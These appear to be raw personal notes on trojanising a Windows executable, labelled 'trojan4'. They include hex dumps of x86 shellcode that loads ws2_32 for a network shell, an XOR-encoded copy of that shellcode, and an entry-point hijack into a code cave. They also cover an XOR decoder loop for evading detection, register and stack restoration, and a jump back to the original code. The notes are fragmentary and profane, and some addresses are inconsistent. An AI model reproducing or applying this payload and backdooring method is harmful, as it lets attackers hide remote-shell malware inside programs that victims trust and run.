








00000000 6A EB 4D E8 F9 FF FF FF 60 8B 6C 24 24 8B j.M.....`.l$$.
0000000E 45 3C 8B 7C 05 78 01 EF 8B 4F 18 8B 5F 20 E<.|.x...O.._ 
0000001C 01 EB 49 8B 34 8B 01 EE 31 C0 99 AC 84 C0 ..I.4...1.....
0000002A 74 07 C1 CA 0D 01 C2 EB F4 3B 54 24 28 75 t........;T$(u
00000038 E5 8B 5F 24 01 EB 66 8B 0C 4B 8B 5F 1C 01 .._$..f..K._..
00000046 EB 03 2C 8B 89 6C 24 1C 61 C3 31 DB 64 8B ..,..l$.a.1.d.
00000054 43 30 8B 40 0C 8B 70 1C AD 8B 40 08 5E 68 C0.@..p...@.^h
00000062 8E 4E 0E EC 50 FF D6 66 53 66 68 33 32 68 .N..P..fSfh32h
00000070 77 73 32 5F 54 FF D0 68 CB ED FC 3B 50 FF ws2_T..h...;P.
0000007E D6 5F 89 E5 66 81 ED 08 02 55 6A 02 FF D0 ._..f....Uj...
0000008C 68 D9 09 F5                               h...









FC 6A E4 42 E7 F6 F0 F0 F0 6F 84 63 2B 2B
84 4A 33 84 73 0A 77 0E E0 84 40 18 84 50
2F 0E E4 46 84 3B 84 0E E1 3E CF 96 A3 8B 
CF 7B 08 CE C5 02 0E CD E4 FB 34 5B 2B 27 
7A EA 84 50 2B 0E E4 69 84 03 44 84 50 13 
0E E4 0C 23 84 86 63 2B 13 6E CC 3E D4 6B 
84 4C 3F 84 4F 03 84 7F 13 A2 84 4F 07 51 
67 81 41 01 E3 5F F0 D9 69 5C 69 67 3C 3D 
67 78 7C 3D 50 5B F0 DF 67 C4 E2 F3 34 5F 
F0 D9 50 86 EA 69 8E E2 07 0D 5A 65 0D F0
DF 67 D6 06 FA A2 58 F0 D6 53



https://reverseengineering.stackexchange.com/questions/8050/raw-offsets-to-disassembler-offsets




its in rdata partition


target raw offset = 

00001000

-

00001000

+ 

00003000

+

00400000



last two are 403000


THATS THE ADDRESS, OVERWRITE THAT UNTIL
00403093     FFD6               CALL ESI




00001010: 3c8b 7c05 7801 ef8b 4f18 8b5f 2001 eb49  <.|.x...O.._ ..I
00001020: 8b34 8b01 ee31 c099 ac84 c074 07c1 ca0d  .4...1.....t....
00001030: 01c2 ebf4 3b54 2428 75e5 8b5f 2401 eb66  ....;T$(u.._$..f
00001040: 8b0c 4b8b 5f1c 01eb 032c 8b89 6c24 1c61  ..K._....,..l$.a
00001050: c331 db64 8b43 308b 400c 8b70 1cad 8b40  .1.d.C0.@..p...@
00001060: 085e 688e 4e0e ec50 ffd6 6653 6668 3332  .^h.N..P..fSfh32
00001070: 6877 7332 5f54 ffd0 68cb edfc 3b50 ffd6  hws2_T..h...;P..
00001080: 5f89 e566 81ed 0802 556a 02ff d068 d909  _..f....Uj...h..
00001090: f5ad 57ff d653 5353 5353 4353 4353 ffd0  ..W..SSSSSCSCS..
000010a0: 6668 115c 6653 89e1 9568 a41a 70c7 57ff  fh.\fS...h..p.W.
000010b0: d66a 1051 55ff d068 a4ad 2ee9 57ff d653  .j.QU..h....W..S





Encoding starts - 00401226 #just after nop
#00401239       C7               DB C7


Encoding stops  - 004018DB       00               DB 00

 #just before code cave    

  



MOV EAX, 00403000        # Save start of encoding address in EDX
XOR BYTE PTR DS:[EAX],0F  # XOR the contents od EDX with xor key - 0F.
INC EAX                   # Increase EAX.
CMP EAX, 00403093         # Have we reached the end enc. address?
JLE SHORT 004018E5        # If not, jump back to XOR command.

PUSH EBP                  # If you have, restore 1st hijacked command.
MOV EBP,ESP               # Restore 2nd hijacked command.
SUB ESP,8              # Restore 3rd hijacked command.
JMP 00401226              # Jump to where we left off from.




00401226   > C70424 0100000>MOV DWORD PTR SS:[ESP],1

00401200




0x00402040







lets try from the top but implement this stuff as well




PUSHAD                            # Save the registers
PUSHFD                            # Save the flags
#TAKE NOTE OF ESP HERE, ADJUST IT TO THAT WHEN YOU GET BACK
...shellcode...       
STACK ALIGNMENT                   # Restore the stack to its previous value
dont do shit, just replace the fucking commands , pop esp
#
POPFD                             # Restore the flags
POPAD                             # Restore the registers

do commands u overwrote

...restore execution flow...




go without shellcode initially






first commands:

00401220 > $ 55             PUSH EBP
00401221   . 89E5           MOV EBP,ESP
00401223   . 83EC 08        SUB ESP,8
00401226   . C70424 0100000>MOV DWORD PTR SS:[ESP],1
0040122D   . FF15 CC504000  CALL DWORD PTR DS:[<&msvcrt.__set_app_ty>;  msvcrt.__set_app_type
00401233   . E8 C8FEFFFF    CALL Copy_of_.00401100
00401238   . 90             NOP
00401239   . 8DB426 0000000>LEA ESI,DWORD PTR DS:[ESI]
00401240   . 55             PUSH EBP


00401220 > $ 55             PUSH EBP
00401221   . 89E5           MOV EBP,ESP
00401223   . 83EC 08        SUB ESP,8


these 3 got done:

00401220 > $               PUSH EBP
00401221   . 89E5           MOV EBP,ESP
00401223   . 83EC 08        SUB ESP,8















#
PUSHAD                            # Save the registers
PUSHFD                            # Save the flags
#TAKE NOTE OF ESP HERE, ADJUST IT TO THAT WHEN YOU GET BACK - ESP is 0022FFC4
...shellcode...       
STACK ALIGNMENT                   # Restore the stack to its previous value
dont do shit, just replace the fucking commands , pop esp
#P
POPFD                             # Restore the flags
POPAD                             # Restore the registers

do commands u overwrote

...restore execution flow...




overwrite with:  - 0x004018e0

PUSHAD
PUSHFD



POPFD
POPAD
PUSH EBP
MOV EBP, ESP
SUB ESP, 8


JMP 00401226













next lets add the shellcode:

PUSHAD
PUSHFD




#TAKE NOTE OF ESP HERE, ADJUST IT TO THAT WHEN YOU GET BACK - ESP is 0022FFC4





MOV EAX, 00403000        # Save start of encoding address in EDX
XOR BYTE PTR DS:[EAX],0F  # XOR the contents od EDX with xor key - 0F.
INC EAX                   # Increase EAX.
CMP EAX, 00403093         # Have we reached the end enc. address?
JLE SHORT 004018E7        # If not, jump back to XOR command.


SUB ESP, 24 # 0022FFC4 – 0022FFA0 = 4



POPFD
POPAD
PUSH EBP
MOV EBP, ESP
SUB ESP, 8


JMP 00401226


trojan4

















mroe spread outshellcode and lets add it manually via xxd
PUSHAD
PUSHFD




#TAKE NOTE OF ESP HERE, ADJUST IT TO THAT WHEN YOU GET BACK - ESP is 0022FFC4


#00403000 + 200 = 403200 # 



MOV EAX, 00403000        # Save start of encoding address in EDX
XOR BYTE PTR DS:[EAX],0F  # XOR the contents od EDX with xor key - 0F.
INC EAX                   # Increase EAX.
CMP EAX, 00403200         # Have we reached the end enc. address? #00403000 + 200 = 403200
JLE SHORT 004018E7        # If not, jump back to XOR command.


SUB ESP, 24 # 0022FFC4 – 0022FFA0 = 4



POPFD
POPAD
PUSH EBP
MOV EBP, ESP
SUB ESP, 8


JMP 00401226


trojan4
